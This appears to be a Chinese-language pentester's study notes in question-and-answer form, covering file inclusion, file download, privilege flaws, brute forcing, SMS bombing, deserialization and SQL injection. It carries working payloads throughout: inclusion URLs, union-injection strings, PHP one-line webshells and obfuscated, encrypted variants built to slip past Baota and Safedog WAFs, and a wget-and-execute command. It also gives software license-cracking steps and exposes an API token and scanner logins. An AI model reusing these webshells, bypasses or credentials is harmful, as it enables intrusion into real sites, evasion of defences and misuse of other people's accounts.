php中可执行的敏感函数：eval assert call_usr_func...  直接禁用了它们



### 16.什么是文件包含漏洞？

将文件包含进去之后会调用文件里的代码，即将指定的文件的代码按脚本代码执行，可控制变量+include函数的使用造成文件包含漏洞
如某1.txt中存有phpinfo();的信息，则在url拼接此文本会进行执行，那么就是存在文件包含漏洞
文件包含漏洞直接将其他非脚本代码按脚本代码来执行



###### 如何检测文件包含漏洞？

白盒：代码审计
黑盒：漏扫，公开漏洞，手工看参数值及功能点



###### 文件包含漏洞有哪些？

本地无限制的包含漏洞：只能利用本地文件如：http://192.168.31.200/include.php?filename=../../../../../../1.txt
本地有限制的包含漏洞：有一些干扰，需要用特殊的方法绕过，如：
http://192.168.31.200/include.php?filename=phpinfo.txt%00 php版本<5.3.4
http://192.168.31.200/include.php?filename=phpinfo.txt..........................长度截断，windows只能识别256位，linux长于4096位
远程文件无限制包含漏洞：可以自己去创建确定对方可访问的文件如：http://192.168.31.200/include.php?filename=http://chentuo.asia/1.txt，利用此漏洞可以加上<?php @eval($_POST['x']);?>，利用菜刀连接
远程文件有限制包含漏洞：如?filename=http://chentuo.asia/1.txt%00，?filename=http://chentuo.asia/1.txt%23



###### 文件包含漏洞的利用？

?filename=php://filter/read=convert.base64-encode/resource=1.txt
?filename=php://filter/read=convert.base64-encode/resource=index.php (不需要打开开关)
?filename=php://input
http://192.168.31.200/include.php?filename=file:///C:/1.txt
http://192.168.31.200/include.php?filename=data://text/plain,<?php phpinfo();?>
http://192.168.31.200/include.php?filename=data://text/plain,<?php echo 'shabi';?>
利用时需要查找资料判断是否支持相关协议的使用



### 17.文件下载漏洞？

文件被解析：则是文件包含漏洞；显示源代码：则是文件读取漏洞；文件被下载，则是文件下载漏洞。
如果下载不到数据库配置文件或者web.xml等，可以去下载跟系统相关的配置信息



###### 文件下载漏洞中的注意点：

可以下载一些恶意文件：后台首页日志文件，数据库配置文件（扫描工具爬行或这下载好的代码去分析路径），各种接口文件，密钥信息等文件
目录爬行寻找已知文件的目录，查看源码中的include寻找更多的敏感目录信息,通过跳级即../的形式去下载得到路径的敏感文件
/Users/chentuo/Public/tool/webpath_网站目录字典/DirScan 来自安全圈的字典/php.txt是个很全的字典
能下载到的与直接在前端url界面上拼接地址的完全是不一样的，一个是源文件，一个是已经被解释后的文件。



###### java中配置文件的下载：

如何发现了下载漏洞但是get方法无法获取到文件，可以尝试切换到post或者其他提交方式进行下载
javaWEB中WEB的配置文件WEB-INF/web.xml，里边有很多重要的信息
配置文件中的com.wm.ctf.FlagController表示实际中的WEB-INF/classes/com/wm/ctf/FlagController.class



###### php中配置文件的下载：

如果需要登陆可以点击登陆查看一下数据包进行分析数据包
分析url地址判断是可能存在哪种漏洞，判断对方是根据哪个关键字识别是否登陆的
如果有mvc的框架，可以去尝试下载module中的敏感文件如..xx../etc/nginx/nginx.conf



###### 黑盒情况下如何发现文件下载漏洞？

根据文件名和参数值、功能点去发现：
read.xxx?filename=
down.xxx?filename=
readfile.xxx?file=
downfile.xxx?file=
../ ..\ .\ ./等
%23 ? %00 %20 .等
&readpath &filepath &path &inputfile &url &data
&readfile &menu &META-UNF WEB-INF



### 18.静态编译和动态解释：

编译型语言定义：编译型语言首先是将源代码编译生成机器指令，再由机器运行机器码 (二进制)。
解释型语言的定义：解释型语言的源代码不是直接翻译成机器指令，而是先翻译成中间代码，再由解释器对中间代码进行解释运行。

###### java是属于静态编译还是动态解释？

编译型和解释型的定义是对立存在的，但也可以在一个语言中同时存在。比如 java 语言同时兼有编译型和解释型特点。整个流程如下：
将源代码（.java 文件）编译生成字节码（.class 文件），再通过 JVM（java 虚拟机）运行生成机器指令，由机器运行机器码。注意，此处生成机器语言前的操作是解释型，每次运行都要重新解释。因此，此处表明 java 是解释型。
但是，部分 JVM（java 虚拟机）有一种 JIT（Just in time）机制，能够将部分已经解释翻译的常用机器指令保存。下次不需要解释，直接运行即可。此时 java 是编译型。
因此，现在用编译型和解释型区分语言是行不通的。



### 19.什么是逻辑越权，分为哪几种？各有什么样的危害？

水平越权：普通用户A有了普通用户B的访问权限  危害到了网站上其他用户信息的安全
垂直越权：普通用户A有了管理员或者超级管理员的权限
未授权访问：不需要登陆就有了权限，可以操作需要登陆才能操作的行为



###### 水平越权中前期信息收集如何获得其他人的名称信息？

网站的注册，如果用户名已经注册，表示这个用户是存在的
网站可以访问其他人的空间可以判断这个人是否存在



###### 垂直越权里边是否可以拿到可以伪造的数据包？

要进行垂直越权漏洞的验证，前提必须获取添加用户的数据包
普通用户有操作界面可以抓取数据包
通过本地搭建网站源码自己模拟抓取
或者就是盲猜



###### 逻辑越权产生的原因是什么？前后端需要注意什么？

前端安全造成：界面，判断用户等级之后，代码界面部分进行可选显示
后端安全造成：数据库 user表 管理员和用户同表 根据usertype/level/other来判断是否是什么权限
或者用类似的字符去判断用户的级别，如果在访问网站数据包中有传输用户的编号、用户组编号或者类型编号的时候，那么尝试对这个值进行修改，就是测试越权漏洞



###### 怎么检测一个网站是否有逻辑越权？具体原理是怎样的？

登陆普通用户A，拿到用户A的cookie，通过前期的信息收集去在访问A的数据包里修改部分数据，使得当前查看信息的url执行另一个用户B，此时仍用的是A的cookie凭据，如果能够得到B的身份信息，那么就是存在水平越权漏洞的。可以选择burp下的intruter不断重发编号，测试其他用户的编号。
如果用A的cookie的凭据登陆了后台管理员的账户，那么就是垂直越权漏洞。
如果不用任何的普通用户登陆，就可以进入对方的后台，就属于未授权访问。



###### burp中的插件authz是如何使用的？

登陆普通用户A，截取数据包，利用intruter模式将用户A的姓名换成其他用户的姓名（前提是撇开密码的影响，或者密码已经可以实现突破），将数据发送至authz模式，鞋带上A用户的cookie凭据，根据回复的特征码判断用户是否登陆成功。



###### 如何使用burp的插件AuthMatrix进行逻辑越权的判断？

需要安装jython和jruby两个环境，倒入至burp的扩展应用中。
AuthMatrixy插件用于越权漏洞的检测，在插件中配置多个不同用户的Cookies，检测各等级账号对页面的访问权限。
在靶场注册两个账号发送至burp中，在burp中authmatrix中添加用户角色为对应的账号。
在登陆出进行抓包，发送至repeater模式，将两个用户的cookie的信息分别发送至各自对应的插件用户中。
在 Repeater 或 Proxy 的 HTTP History 处选择需要检测的 requests 后右键，选择 Send request to AuthMatrix。
run会自动将每个 request 里的 cookie 换成之前设置的同名 cookie，当 response 匹配到正则时，会出现红色，反之是绿色



###### 谷歌浏览器中哪款插件可以进行逻辑越权的判断？

https://github.com/ztosec/secscan-authcheck ,可以很方便的检测越权漏洞，但环境部署失败了



###### 如何防范逻辑越权？

前后端同时对用户输入信息进行校验，双重验证机制
直接加密资源ID，防止攻击者枚举ID，敏感数据的特殊化处理
永远不要相信来自用户的输入，对于可控参数的严格检查于过滤
各种个样的WAF产品
数据可以直接从数据库中取，而非从数据包中获取数据
回退重换：先购买一个产品，在重新购买一遍，如果没有检测数据包的唯一性或者token，那么会在此购买，于是可以以低价格实现高价格的购买，这是逻辑上的一个问题产生在多方面的，称为逻辑安全问题



### 20.http与https登陆的区别在哪里？两者进行爆破需要注意什么？

http登陆的时候密码是明文显示的,正常的话是不会加密的，可以依次替换字典进行爆破
如果加密了，可以尝试破解加密方式，将自己的注入点代码进行同样的加密方式加密然后发送至服务器
https一般都是加密了的，尝试是否能破解其加密手段，如果无法破解那么意味着无法爆破



###### 登陆的地方进行爆破的方式？

第一种方式是直接跑字典，第二种方式是在破解对方加密手段后将自己的字典以加密的形式发送出去。



###### burp如何进行爆破配合加密进行对网站后台的突破？

首先用目录扫描工具扫描出对方网站的后台地址并尝试登陆，抓取数据，将数据发送至intruder，加载密码字典，以hash算法中的加密算法进行加密自己的字典，进行暴力破解。根据返回数据的长度判断是否破解成功。
Hash，一般翻译做散列、杂凑，或音译为哈希，是把任意长度的输入通过散列算法变换成固定长度的输出，该输出就是散列值。其中md5就属于一种hash算法。



###### cookie脆弱点的攻击

有的登陆是需要验证cookie的，cookie过滤不严谨导致可以随意篡改数据包登陆
如何寻找cookie的脆弱点很难，需要结合源码审计完成，如有的网站逻辑验证不完善，会在登陆的cookie的地方进行判断，只是一个简单的判断的地方可以自己进行绕过。



###### 商品购买流程中可能出现的漏洞：

选择商品和数量-选择支付及配送方式-生成订单编号-订单支付选择-完成支付
根据购买时抓取数据包进行分析，测试是否能修改数量，订单编号，商品等信息
主要看对方的数据包中传入的是什么参数，从而进行测试
如果对方代码逻辑不严谨，可以对低价订单购买高价订单，伪造商品数量，伪造商品价格，伪造当前订单编号等效果



### 21.找回密码流程时可能存在哪些漏洞，如何利用？

### 什么情况可以爆破，是否可以替换为其他的验证码？

找回密码时存在一个验证码复用的问题，开发者只产生了生成验证码，没有对当前的验证码与手机号进行对应，
于是可以利用一个已知的手机号码去申请一个验证码，在利用这个验证码去修改其他人的手机号密码即可。
如果此验证码是纯数字加字母的情况，并且后台没有做任何限制，比如一分钟最多请求1次，可以进行爆破。
在数据包中看是否有验证码的信息体现，是否被加密了，能否解密出来等情况。



###### 三段验证与一段验证具体上操作有什么区别？

区别在于绕过的方式是不同的，一般采用如下两种方法
一般是第一个页面 输入手机号 获取验证码 第二个页面 重置密码
但如果是对方只有一个页面，这个页面里边能填写所有信息，那么就不安全
先用自己的手机号写上去，得到验证码，保证验证码正确的前提下，修改自己的手机号为另一个用户的手机号，改变其手机号的密码（在数据包里改掉手机号）
如果是第一个页面 获取验证码 第二个页面 验证 第三个页面 重置密码
把三个页面的数据包全部抓到，在第一个页面的数据包加载完成之后替换为第三个页面的数据包，将第二个页面给直接跳过，是流程问题



###### burp代理回复的数据包，如何代理？有何意义？

不仅可以只拦截由本地发送的数据包并且进行篡改，而且也可以拦截由对方服务器发送的数据包，进行回复数据的伪造
在截取到发送的数据包后进行操作dointercept---response to this request，可以截取回复的数据包
某些应用会通过服务器的回显值来判断是否加载某些有权限的页面，可以更改次回复值进行伪造

如何通过burp抓取验证码的回复值实现任意手机号无验证码修改密码？有什么前提条件？有什么特点？
前提是对方开发者的逻辑上有这个漏洞，验证码本应存储在对方后台且使用过后就要销毁的
如果对方针对一个验证码就只有一次验证的机会的话，是不会有这个漏洞的



###### burp代理手机流量的时候需要注意什么地方？

代理手机流量的时候，burp的代理要开在主机ip地址下的某个开放的端口，而不能是本地回环地址
同时手机需要和burp处于同一局域网内，并在局域网的代理处设置为burp开的代理



###### 短信轰炸的原理是什么？如何实现？

某些应用点击注册的时候截获数据包，将这个数据包进行截取，在数据包中可能会有明文传送的手机号
将此手机号设置为一个动态的payload，通过自己已知的其他人的字典进行发包，通过设置延时发送数据包
实现了对手机号的短信轰炸的功能

服务端验证码验证可能会有什么漏洞？怎么突破？
服务端的验证码一般是复用的问题或者进行爆破，可以重复利用某一个验证码或者将验证码从0开始爆破

客户端验证码是否会有漏洞存在？如何判断时客户端的验证？如何突破？
客户端验证码一般是通过js文件加载的，客户端的验证完全可以通过代理软件进行突破

验证码复用可以用来做什么？可能会遇到什么障碍？
可以任意修改别人手机号对应的密码，可能遇到的是60s认证障碍。



### 22.token是什么？

token每一次登陆的时候都会随机产生一个，是防护者做的一个安全体系，是比较安全的。一般很难破解，如sha256算法没有密钥是没法得到解密信息的，可以尝试用爆破，或者从返回数据中截取token测试。如果没有就放弃。

###### burp 中intruder的四种模式分别是什么？

```
Sniper--1 payload set--其他变量不变，第一个变量先遍历所有的payload，以此类推
Battering Raw--1 payload set--所有变量同时改变，同时取到payload中的值进行遍历
Pitchfork -- 2 payload set -- 两个变量同时取到各自payload目录中的相同的位置的载体
Cluster bomp -- 2 payload set -- 其他变量不变，第一个变量遍历自己的payload，然后其他变量的自身的payload往后推一，类推
```



###### 如何利用burp同时改变密码和token，且token是从返回包中截取的？

在爆破密码的时候选择pitchfork模式，密码作为变量，其内容为暴力破解字典
token值作为变量，线程设置为1，（多线程一次操作发送了多个数据，这多个数据的token值是不同的），打开最底部always cookiex开关，grep扩展中，找到自己要截获的前端页面上的token值并加载
选择payloads中的递归搜索Recurisive grep模式，加载此截获的token值，发送数据包



###### burp如何使用爬虫功能对网站探测并进行筛选？

burp中将数据包截获之后有发送至爬虫模式，当前阶段预览的数据功能足够多的情况下，可以通过爬虫模式识别网站的目录结构，以及关键信息的过滤，根据特定的关键词寻找漏洞。



###### burp的扫描漏洞功能如何？

将数据包截获够发送到scanner，只能扫描到一些非常浅的东西，不推荐使用。



### 23.什么序列化，什么是反序列化？有什么危害？

序列化就是将对象转化为字符串，反序列化相反，数据的格式的转换对象的序列化利于对象的保存和传输，
危害：SQL注入，代码执行，目录遍历
脚本语言序列化后变成 二进制/XML/json 的形式，后者转化为前者是反序列化

###### php中无类字符如何进行序列化与反序列化？var_dump(unseriral($flag))有什么作用？

```
<?php
$KEY='i:123';
echo unserialize($KEY); //这是反序列化json格式转化成对象格式
?>
当然，也可以正向运行，拿到序列化后的值，在代入到此代码中反序列化即可
<?php
$KEY='IServer:www.isecer.com';
echo serialize($KEY); //这是序列化转化成json格式
?>
var_dump(unseriral($flag))可以将一个反序列化后的类的值打印出来
```



###### 如何篡改数据包中的数据，有哪几种方法？

通过浏览器插件，或者burp，或者其他代理软件。

###### 代码的执行顺序对漏洞的产生有什么影响？

注意某些变量的赋值顺序，赋值在后，在为空，可能会对破解造成一定的干扰。

###### php中有类的反序列化中几个常见的魔术方法？如何触发？

```
_construct()//创建对象时触发
__destruct() //对象被销毁时触发
__wakeup()，执行unserialize()时，先会调用这个函数
```



###### php中两个等于与三个等于号的区别在哪里？

两个等于号并不是严格意义上的等于，比如‘ 2’==‘2’
而三个等于号必须是严格意义上的等于，比如‘3’===‘3’



###### php反序列化漏洞产生的原因是什么，如何利用这个漏洞？

php中有一些魔术方法，在实例化时后者其他操作时不经意间出发了类中的方法，可以利用这个特点，将自己伪造的数据带入其中，让自己伪造的数据反序列化后可以读取存储在类中魔术方法中的数据



###### 如果参数是一个类，如何通过反序列化来传这个类？

需要重写这个类，并且将所有的变量按照自己破解的规范进行书写，最后进行实例化



### 24.java的序列化和反序列化？

writeobject先转化为json，在readwrite转化为对象，中间有函数
Runtime.getRuntime().exe c(this.taskAction); 调用了系统命令
序列化：将对象转化为字节的过程称为序列化过程。
反序列化：将字节转化为对象的过程称为反序列化。



###### java反序列化漏洞产生的原因？如何利用？生成payload的原理是什么？

漏洞产生的原因就在于数据执行了系统命令，并且这个参数序列化后可以人为的进行控制。



###### jar文件怎么反编译，方便审计代码？

通过jd-jui或者相应的java的idea工具进行反编译获取源码。



###### ysosersial怎么生成反弹shell 的payload？流程是什么？为什么反弹，解决了什么问题（不回显）？

原始数据->序列化writeobject->base64编码->传输->base64解码->反序列化readobject->最终数据
反弹的作用在于即便成功的执行了相关系统命令，也不能接受到相应的回显，所以需要反弹shell



###### 如何区别base64编码和十六进制编码的java序列化后的数据？如何判定是否是序列化操作？

一段数据以rO0AB开头，基本可以确定这串就是JAVA序列化base64加密的数据
或者如果以aced开头，那么他就是这一段java序列化的16进制
只要是开头是这样的数据，就可以认为这是java的反序列化。



###### swagger是java的什么？

是专门用来搞java开发的一个管理UI界面的一个模块，这个界面是反序列化漏洞产生的有关的。
可以通过这个组件的界面去管理java的反序列化后的相关数据。

###### 如何寻找java反序列化漏洞？

根据相关的关键词信息进行筛选，判断是否存在可以输入序列化后的值的地方。



### 25.拿到一个网站之后应该怎么攻击？



###### 网站搭建习惯

目录型号 ： 一个网站里边有一套CMS，其子目录里边有另外一套CMS
端口型号：除了80端口的其他端口有其他的CMS
子域名：同属于同一个顶级域名下的其余子域名
类似域名：同一家公司的相似的域名
旁注：同一服务器下的多个域名
C段：同一网段、不同服务器下的域名



###### 网站渗透思路 端口+域名+关键词+备案+robots

```
信息收集的操作------
直接用黑暗引擎搜索域名：得到相关端口信息
搜索相关子域名的信息：谷歌/在线工具/layer
用nmap进一步获取信息：各个端口是否有漏洞
爆出服务版本后：在各大漏洞平台查询此漏洞是否存在过相关漏洞
备案信息查询：通过备案信息查看是否注册过其他域名
其他域名的信息收集：在黑暗引擎上搜索相关的域名
在谷歌上搜索：公司信息及域名中的相关关键词
在网站上的操作：跟上robots.txt查找爬虫协议，强制报错看页面回显
CMS的识别：查询每个网站目录的CMS攻击层面
并且循环这个测试步骤………………
```



###### mysql注入流程

从上至下，逐级渗透：数据库名-表名-列名-数据-......
猜解列名：
id=1 order by 1
id=1 order by 2
.....
id=1 order by 4 猜到临界点可得错误页

报错猜解准备：
id=1 union select 1,2,3,4
id=1 and 1=1 union select 1,2,3,4 爆出一个数字的错误
或者id=-1 union select 1,2,3,4

根据报错的数字查询：(如这里有2，3)
id=-1 union select 1,database(),version(),4
id=-1 union select 1,user(),@@version_compile_os,4

查询指定数据库下的表名信息：
id =1 union select 1,table_name,group_concat(table_name),4 from infomation_schema.tables where table_schema='mozhe_Discuz_StormGroup'

查询指定表名下的列名信息：
id =1 union select 1,table_name,group_concat(column_name),4 from infomation_schema.columns where table_name='StormGroup_name'

查询指定数据：
id =1 union select 1,name,passwd,4 from StormGroup_name

破解加密信息：
md5解密或者其他的进行解密查询最终密码

```
information_schema.schemata;记录所有的数据库名
information_schema.tables 记录所有表名信息的表
information_schema.columns 记录所有列名信息的表
table_name 表名
column_name 列名
```



### 26.系统漏洞扫描有什么意义，可以采取哪些软件？

网站寄生在服务器上边，如果服务器有漏洞，可以直接通过服务器的漏洞获取到网站的权限。
有忍者渗透系统中的goby，以及nmap扫描漏洞，以及nessus扫描系统漏洞，其中nessus比较好使。



###### 扫描到漏洞之后怎么利用，怎么寻找EXP？

工具框架：msf(aux表示验证,search,use,show options,set ,run)，searchexploit
单点POC：CNDV，seebug，exploit-db，0day
文章复现：结合网络上存在的相关信息，或者在github上寻找exp



###### exploitdb 搜索相关的漏洞是否存在

./searchsploit blue
可以很便捷的搜索到是否存在相关的漏洞,exp就在对应目录里边
或者在https://www.exploit-db.com/中进行搜索
是国外的人写出来的，对国内不出名的cms不敏感



###### 如何修复这些漏洞？

打上官方公开的补丁，关闭漏洞产生的入口，部署相关WAF，搞到蓝队的武器。



###### 如何使用nessus进行系统漏洞的发现 leishianquan/awvs-nessus 漏洞发现

```
docker pull leishianquan/awvs-nessus
docker run -it -d --name="awvs-nessus" -p 13444:3443 -p 13445:8834 leishianquan/awvs-nessus:v4
docker exec –it `docker ps | grep nessus | awk '{print $1}'` /bin/bash 
/etc/init.d/nessusd start
```



awvs

```
cp /home/license_info.json /home/acunetix/.acunetix/data/license/   破解awvs：
chmod 444 license_info.json  
在awvs运行过程中，license_info.json文件会被持续覆盖造成破解无效
在执行完cp命令, 将license_info.json设置为只读即可
https://110.42.178.227:13444/ awvs13 username: leishi@leishi.com  awvs13 password: Leishi123
https://110.42.178.227:13445/ nessus username:leishi  nessus password :leishianquan
```



### 27.web漏洞如何扫描？有什么好办法？

已知cms：漏洞平台扫描（exploit-db，seebug，cnvd，0day），cms扫描工具（cmsscan，wpscan，tpscan，joomscan，drupalscan），代码审计（函数点挖掘，功能点挖掘，框架类挖掘）
开发框架：PHP（thinkphp），java（shiro，struts，spring，maven），python（django，flask）
未知cms：工具（xray，awvs，appscan），人工探针（应用功能，URL参数，盲猜测试）



###### 如何确认对方的框架？确认之后怎么利用？

通过报错看是否有相应的框架信息被暴露出来，或者抓取数据包看能否看到server
或者将数据包中比较特殊的url复制出来，在黑暗引擎上搜索其他可以通过报错看到框架信息的网址
通过这些方法找出来框架之后在针对框架进行漏洞利用
如可以通过thinkphp远程命令执行工具直接一步检测，漏洞平台查找，或者文章复现或者vulhub寻找



###### 如何确定对方采用的cms？怎么利用？

用在线工具直接搜索，用谷歌的插件辅助识别，用数据包中特殊的url地址进行搜索，看网站的特殊位置人工识别
在漏洞平台上搜索，利用这个cms特定工具进行搞，或者文章复现等来利用
如利用wpscan针对wordpress的漏洞进行利用 gem install wpscan
wpscan --url http://1.117.52.219:8000/ --api-token eG5iT4ooiuP7eVJVedsHhlgx8xeZHmAJjBr13asnjEc

如果cms和框架都没问题，需要源码审计，怎么审？
sql参数控制中的可控来源在那里，去分析这个人为控制的来源在哪里
去看一下这个源码，分析这个源码可能会在哪里有漏洞，哪里可以有输入



### 28.案例思路：

```
访问robots.txt 根据爬虫信息观察
进行初步CMS判断，及是否存在漏洞
进行报错判断，看是否显示版本信息 
尝试获取对方cms版本，如/data/admin/ver.txt
进行CMS中某些敏感文件的下载
尝试目录扫描
尝试寻找登录的后台地址
尝试弱口令爆破后台地址
端口扫描进行观察
判断其他关键信息
发现888端口暴露，尝试宝塔未授权漏洞
进行遗留源码的获取，尝试备份文件的搜索
审计源码目录，获取数据库账号密码
尝试navicat进行连接数据库
普通用户可支持外联，但宝塔却有限制
搜寻源代码，寻找更多的历史遗留信息
在源文件中找到更早之前的备份文件
最终连接数据库成功
```



### 29.手机软件如何进行渗透测试？

反编译提取url，抓包获取url(bp,charles,fiddler,抓包精灵)，如不存在此协议，转移到其他协议(wireshark)测试 
根据url进行扫描工具的使用，找交互的地方，找可能出现sql出现的url如?id= 
利用charles进行app的扫描，这个用来抓取手机app的数据更适用



###### 如果app内中可以打开页面，但是用网页打开显示不出来？

对方有识别，检测到在使用app时可以正常访问，但是用网页打开时数据包构造不同 
可以改变每一次访问时的user-agent，或者利用xray进行被动扫描



###### xray如何配合burp实现联动，有什么意义？

可以实现对手机流量的自动扫描，由于手机和电脑不在同一ip段，需要先通过burp代理手机上的流量
在通过burp的流量出口代理到xray，从而实现对手机软件的自动扫描



###### cc攻击是什么？如何防御CC攻击？

找一些网络上的代理，不断的访问某一个网站，占用网站的连接数资源，
当同一时间内连接到某一个网站内的连接数达到限制条件时，网站会直接崩溃。
可以开启WAF，或者识别真实访问地址，如果是同一目标，阻止其访问。



### 30.如何对所测网站进行扩大目标？实现信息收集的最大化？

端口类扫描，如80是一个网站，8080又是另一个网站
子域名收集，跑字典或者在google上搜索可能相关的域名 layer google搜索 teemo
域名后缀收集，查看不同的网站的后缀，是否属于同一个公司
关键词搜索，搜索到公司名字之后，直接引擎搜索该公司
whois查询，查域名的注册人，域名登记
对所有web均扫描，目录扫描，敏感文件扫描 如御剑 dirmap
ip访问，ip对应的地址目录比网站的目录要高，可能获取到敏感源码
就是需要不断的扫，不断的访问，接着获取到更多的目标接着扫，渗透是一个不断的排除的过程
针对每一个服务进行测试排除，是否能利用EXP，能否拿到权限，写入webshell



###### 如收集到某一个网站的端口8080有tomcat服务，该如何测试？

在相关漏洞平台里边如exploit-db，seebug，0day上搜索相关tomcat是否存在高危漏洞，用本地的searchexploit进行搜索漏洞加以利用，并进行漏洞验证，或者找网络上公开的文章进行漏洞的复现。



###### 端口类的服务怎么检测弱口令？

用hydra九头蛇来检测，或者用可视化的超级弱口令检测工具，
可以自定义字典，也可以使用默认的字典进行爆破
注意sql爆破的时候root账户有可能不支持外联



###### 什么是wsdl？对网站的漏洞测试有什么影响？

WSDL 是基于 XML 的用于描述 Web Services 以及如何访问 Web Services 的语言。
wsdl是用来定义一些网络中的接口的语言的，也是有可能存在漏洞的
可以通过搜索wsdl类似的关键词来获取到有调用这个接口的url地址
通过awvs工具可以对wsdl接口进行漏洞扫描并会暴露出exp，可以漏洞验证



###### sqlmap如何在任意位置进行数据的注入？

将数据包截获到，将需要注入的地方用x*代替，执行python sqlmap.py -r 1.txt --batch就可以开始sql注入了
如果是post注入，也可以将post的数据包原封不动的放着，执行命令ython sqlmap.py -r 1.txt -p name,其中name表示要注入的参数



### 31.cc未开启时，如何绕过安全狗？

head和get都是去请求，前者稍微快一些，cc防护未开启时，安全狗会拦截head，模拟用户提交数据时的数据包，经对比发现，get请求的数据包不会被拦截，因此需要把默认的目录扫描的head请求变化为get请求。
cc未开启时，可以更换提交方法或者直接将数据包模拟成真实的用户所提交的数据进行请求。



###### cc流量防护开启了，如何绕过安全狗？

可以采用延时访问，或者代理池技术或者搜索引擎的爬虫技术绕过。
光是模拟用户扫描网站，即user-agent位置为一个单一的用户的时候，是不能成功的避开cc防御的，需要模拟搜索引擎的爬虫技术。
cc主要防御的是同一时间内连接到网站的连接数，就是打开不关闭的情况，用代理池技术进行漏扫可以绕过cc。代理池技术可以使用python爬取免费的代理之后进行指定次数换代理访问，或者利用ptoxy_pool，或者购买网络上收费的代理产品。



###### 如何绕过阿里云的cc防护？

需要进行相关的测试，经测试发现延时或代理池可以绕过。



###### 绕过waf的思路？

查看工具数据包与用户数据包的区别，查看waf的相关说明，fuzz模糊测试
宝塔会禁止对bak文件的扫描，可以尝试对字典做调整，如bak%20等，或者减缓速度或者对线程优化。
实际应用中，要进行多次的测试，尝试找突破口。



### 31.漏洞发现的时候如何绕过WAF？

一般是通过延时，模拟搜索引擎爬虫或者代理池技术搞，但是延时速度太慢，一般不采用，优先选用代理池技术。
可以联动awvs+burp+xray，通过burp的user options做代理端口转发可以更详细的看出来数据包的速度
此时用awvs开始对网站进行测试的时候，xray中也同步进行了测试，实现了两个工具的联动
proxy_pool适合爬虫，但是不适合过WAF，想要过WAF还是需要用付费代理



###### 漏洞利用时如何绕过waf？

sqlmap采用自己通过waf规则阅读总结的绕过规则写成的脚本，以tamper指定，另外设置cookie，user-agent，proxy，延时等
可以通过浏览器设置代理经过burp，再将流量转发至代理池工具，不仅能查看数据包还能实现cc的绕过
文件上传的payload可以采用截断，大小写，双写绕过，尾部为空，点绕过，php5，::$DATA等方式绕过
xsstrike可以设置proxy，timeout等方式，但是需要一些其他的触发，攻击成本大



###### 加密有哪些类型？

可逆的：如base64，hex，url ，ascii（可以直接解密）
不可逆：如md5，AES，sha256 （md5解密是枚举破解）



###### RCE执行漏洞中如何进行WAF的绕过？

考虑到加密方式，但是如果对方是宝塔会讲base64编码方式过滤，采用其他可逆的算法
其中hex加密phpinfo();就是706870696E666F28293B
txt=$hex='706870696E666F28293B';assert(pack("H*",$hex));
或者采用替换的方法，替换掉敏感的字符串,或者直接传参
txt=$y=str_replace('x','','phpxinxfo();');assert($y);
txt=$x='asse';$xx='rt';$xxx=$x.$xx;$y=str_replace('x','','phpxinxfo();');$xxx($y);
txt=$z=REQUEST['x']$y=str_replace('x','','phpxinxfo();');$z($y);并在其他提交方式上传x
根据过滤规则来考虑采用哪用绕过方式，报错之后就尝试其他的方式



###### 文件包含漏洞绕过WAF？

需要进行符号变异，如../ ..\ ./ .\等方式



###### 常见的php一句话后门？

<?php @eval($_POST['x']);?> eval是敏感函数，容易被过滤
<?php assert($_POST['x']);?> 一般在这个基础上进行调整，



###### 如何绕过常见waf对一句话后门的拦截？

需要本地搭建相同的环境进行测试，如宝塔需要尝试以下方式绕过对payload的检测
上传的后门代码的文件名字不能是非常敏感的名字，如shell.php是不支持的
变量覆盖的方法如下
<?php $a=$_GET['x'];$aa=$_GET['y'];$b($_POST['z'])?> 
x=b&y=assert并后门密码是post的z
这种方式可以成功绕过，但宝塔会对z的传入的phpinfo();进行过滤拦截，此时需要加密
如z=cGhwaW5mbygpOw==
于此同时，就需要在传入的后门文件中进行base64解码
即最初的后门文件变为了<?php assert(base64_decode($_POST['x']));?>



###### 加密文件的方法：

通过 https://github.com/djunny/enphp 加密最初的后门文件
 或者利用网上接口 https://www.phpjiami.com/phpjiami.html 进行加密后门文件
加密之后是乱码形式，没有密匙的话无法解密，可绕过宝塔安全狗

###### 异或生成的方法：

在本地的异或生成的代码上直接生成php的后门文件，此后门可作为蚁剑的后门工具
如果要进行base64加密后的值传输的话，需要根据生成的后门文件的代码设置id的值
专门生成蚁剑后门代码的工具 https://github.com/yzddmr6/as_webshell_venom



###### 蚁剑的指纹头造成文件管理时无法显示文件的问题怎么处理？

抓取蚁剑能正常文件管理的数据包时进行分析，发现蚁剑也是执行了相关敏感操作之后的加密信息
现在已经将后门代码写入到了对方的服务器，只需要自己写后门读取或者写入文件到对方后台
可以利用var_dump(scandir('.'))读取本级的目录，并且进行base64编码后传入到自己的后门地址中
可以利用file_put_contents('xiaodi.txt','xigua')写文件到对方本级目录，同样需要base64编码
甚至可以自己编写python脚本，去实现文件浏览的功能



### 32.snetcracker即超级弱口令工具的安装和使用？协议弱口令自查。

在windows上可以正常使用，使用时根据需要选择是否添加新的字典，或者新的密码，选择是否只用一个账户
在mac上pd中有问题，没有解决 ChilkatDotNet4.dll 有报错未能加载
此款工具主要针对非web协议的弱口令暴力破解，是可视化里边爆破服务工具



### 33.服务自查工具？

linux：https://github.com/rebootuser/LinEnum 
可以查看到当前linux机器上的很多相关信息
windows：Get-WmiObject -class Win32_Product
可以直接找到主机中存在的服务，配合searchexploit进行漏洞的利用及复现



###### 应急响应有哪些工具值得使用？

https://github.com/diogo-fernan/ir-rescue 是应急响应的军火库，集成了大量的工具可供使用
windows: TCPview，Process Exploer，PChunter，UserAssitView.exe,autoruns 查看相关进程服务端口任务计划启动项等
linux: GScan,LinEnum,linuxprivchecker 查看服务器相关信息，是否有漏洞，进行自动扫描



###### linux漏洞收集：

LinEnum.sh/linuxprivchecker收集特定信息，为后续提权做准备 ./LinEnum.sh
python3 -m pip install --user --upgrade pip==20.3.4 && pip install linuxprivchecker &&python3 -m linuxprivchecker -w -o linuxprivchecker.log
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh && ./les.sh
perl linux-exploit-suggester-2.pl



###### windows漏洞收集：

https://github.com/bitsadmin/wesng  systeminfo > 1.txt  需要提前通过webshell拿到对方的systeminfo信息对比  python wes.py 1.txt -o vuln.c
https://github.com/chroblert/WindowsVulnScan  pip install requests -i http://pypi.douban.com/simple --trusted-host=pypi.douban.com
PS:.\KBcontroller.ps1	cmd:python cve-check.py -C -f KB.json



###### 什么是勒索病毒？

勒索病毒，是一种新型电脑病毒，主要以邮件、程序木马、网页挂马的形式进行传播。
该病毒性质恶劣、危害极大，一旦感染将给用户带来无法估量的损失。
